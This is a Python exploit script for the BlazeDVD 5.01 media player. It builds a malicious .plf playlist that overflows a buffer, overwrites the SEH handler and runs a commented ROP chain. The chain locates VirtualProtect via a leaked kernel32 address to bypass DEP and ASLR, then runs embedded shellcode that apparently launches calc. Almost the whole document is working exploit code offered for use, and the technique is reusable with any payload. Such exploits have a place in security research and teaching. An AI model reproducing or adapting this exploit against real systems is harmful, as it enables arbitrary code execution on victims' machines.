#!/usr/bin/env python
# BlazeDVD 5.01 DEP/ASLR (non-PUSHAD) exploit by iphelix
import struct

junk1 = "A"*304

#############################################################
# 0x00 Find ourselves on the stack

rop = struct.pack('L',0x64022c64) # PUSH ESP # POP ESI # RETN
rop+= struct.pack('L',0x6161300e) # MOV EAX,ESI # POP ESI # RETN
rop+= struct.pack('L',0x41414141) # junk
rop+= struct.pack('L',0x6403bed7) # ROP NOP (used for alignment
                                  # so we can use [EAX+n],EDX)

rop+= struct.pack('L',0x61602d9c) # {pivot 24} :  # ADD ESP,18 # RETN

#############################################################
# VirtualProtect placeholder
rop+= struct.pack('L',0x11111111) # VirtualProtect
rop+= struct.pack('L',0x22222222) # ReturnAddress
rop+= struct.pack('L',0x33333333) # lpAddress
rop+= struct.pack('L',0x44444444) # dwSize
rop+= struct.pack('L',0x55555555) # flNewProtect
rop+= struct.pack('L',0x6404f7eb) # lpflOldProtect
#############################################################

#############################################################
# 0x10 Virtual Protect

# 0xA Temporarily store EAX in EDX
rop+= struct.pack('L',0x640148ce) # XCHG EAX,EDX # RETN 02
rop+= struct.pack('L',0x6403bed7) # ROP NOP
rop+= struct.pack('H',0x4141)     # junk

# 0xB Extract leaked kernel32 address from the stack
rop+= struct.pack('L',0x61618563) # XCHG EAX,EBP # RETN
rop+= struct.pack('L',0x616301d7) # POP ECX # RETN
rop+= struct.pack('L',0xfffff0d0) # Offset
rop+= struct.pack('L',0x6162938a) # SUB EAX,ECX # RETN
rop+= struct.pack('L',0x6163227d) # MOV EAX,DWORD PTR DS:[EAX] # RETN

# 0xC Calculate VirtualProtect relative to the leaked kernel32 address
rop+= struct.pack('L',0x61628185) # POP EBP # RETN
rop+= struct.pack('L',0xfffee6fc) # Offset
rop+= struct.pack('L',0x6161a228) # ADD EAX,EBP # RETN

# 0xD Fill in the VirtualProtect placeholder
rop+= struct.pack('L',0x640148ce) # XCHG EAX,EDX # RETN 02
rop+= struct.pack('L',0x600139c5) # MOV DWORD PTR DS:[EAX+10],EDX # RETN 08
rop+= struct.pack('H',0x4141)     # junk (RETN 02)

#############################################################
# 0x20 ReturnAddress

# 0xA Temporarily store EAX in EDX
rop+= struct.pack('L',0x640148ce) # XCHG EAX,EDX # RETN 02
rop+= struct.pack('L',0x41414141) # junk (RETN 08)
rop+= struct.pack('L',0x41414141) # junk (RETN 08)

# 0xB Get the placeholder pivot back into EAX
rop+= struct.pack('L',0x6403bf53) # MOV EAX,EDX # RETN
rop+= struct.pack('H',0x4141)     # junk (RETN 02)

# 0xC Put calculated shellcode address into EAX
rop+= struct.pack('L',0x616301d7) # POP ECX # RETN
rop+= struct.pack('L',0xfffffecc) # Offset (Shellcode will be placed after SEH 308 bytes away from EAX)
rop+= struct.pack('L',0x6162938a) # SUB EAX,ECX # RETN

# 0xD Exchange EAX,EDX and store ReturnAddress
rop+= struct.pack('L',0x640148ce) # XCHG EAX,EDX # RETN 02
rop+= struct.pack('L',0x616193b5) # MOV DWORD PTR DS:[EAX+14],EDX # RETN 08
rop+= struct.pack('H',0x4141)     # junk

#############################################################
# 0x30 lpAddress

# 0xA Store lpAddress which is already in EDX
rop+= struct.pack('L',0x64044486) # MOV DWORD PTR DS:[EAX+18],EDX # RETN
rop+= struct.pack('L',0x41414141) # junk (RETN 08)
rop+= struct.pack('L',0x41414141) # junk (RETN 08)

#############################################################
# 0x40 dwSize

# 0xA Adjust EAX so we can still use [EAX+10],EDX instruction
rop+= struct.pack('L',0x616301d7) # POP ECX # RETN
rop+= struct.pack('L',0xfffffff4) # Offset (EAX+C)
rop+= struct.pack('L',0x6162938a) # SUB EAX,ECX # RETN

# 0xB Temporarily store EAX in EDX
rop+= struct.pack('L',0x640148ce) # XCHG EAX,EDX # RETN 02

# 0xC Put 0x201 into EAX
rop+= struct.pack('L',0x6403bed6) # POP EAX # RETN
rop+= struct.pack('H',0x4141)     # junk (RETN 02)
rop+= struct.pack('L',0xfffffdff) # 512 Bytes
rop+= struct.pack('L',0x640377e0) # NEG EAX # RETN

# 0xD Exchange EAX,EDX and store dwSize
rop+= struct.pack('L',0x640148ce) # XCHG EAX,EDX # RETN 02
rop+= struct.pack('L',0x600139c5) # MOV DWORD PTR DS:[EAX+10],EDX # RETN 08
rop+= struct.pack('H',0x4141)     # junk

#############################################################
# 0x50 NewProtect (0x40)

# 0xA Temporarily store EAX in EDX
rop+= struct.pack('L',0x640148ce) # XCHG EAX,EDX # RETN 02
rop+= struct.pack('L',0x41414141) # junk (RETN 08)
rop+= struct.pack('L',0x41414141) # junk (RETN 08)

# 0xB Put 0x40 into EAX
rop+= struct.pack('L',0x64114086) # POP EAX # RETN
rop+= struct.pack('H',0x4141)     # junk (RETN 02)
rop+= struct.pack('L',0xffffffc0) # 0x40 PAGE_EXECUTE_READWRITE
rop+= struct.pack('L',0x6002d513) # NEG EAX # RETN

# 0xC Exchange EAX,EDX and store NewProtect
rop+= struct.pack('L',0x640148ce) # XCHG EAX,EDX # RETN 02
rop+= struct.pack('L',0x616193b5) # MOV DWORD PTR DS:[EAX+14],EDX # RETN 08
rop+= struct.pack('H',0x4141)     # junk (RETN 02)

#############################################################
# 0x60 Execute VirtualProtect

# 0xA Adjust EAX to point to the VirtualProtect call (use INC for a change)
rop+= struct.pack('L',0x61630fa3) # INC EAX # RETN
rop+= struct.pack('L',0x41414141) # junk
rop+= struct.pack('L',0x41414141) # junk
rop+= struct.pack('L',0x61630fa3) # INC EAX # RETN
rop+= struct.pack('L',0x61630fa3) # INC EAX # RETN
rop+= struct.pack('L',0x61630fa3) # INC EAX # RETN

# 0xB Execute VirtualProtect
rop+= struct.pack('L',0x616248b3) # XCHG EAX,ESP # RETN

junk2 = "C"*(612 - len(rop) - len(junk1))
print len(junk2)

seh = struct.pack('L',0x600148df) # ADD ESP,400 # RETN

sc = "\x66\x81\xE4\xFC\xFF\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7\xCC"

payload = junk1 + rop + junk2 + seh + sc

f = open('exploit.plf','w')
f.write(payload)
f.close()

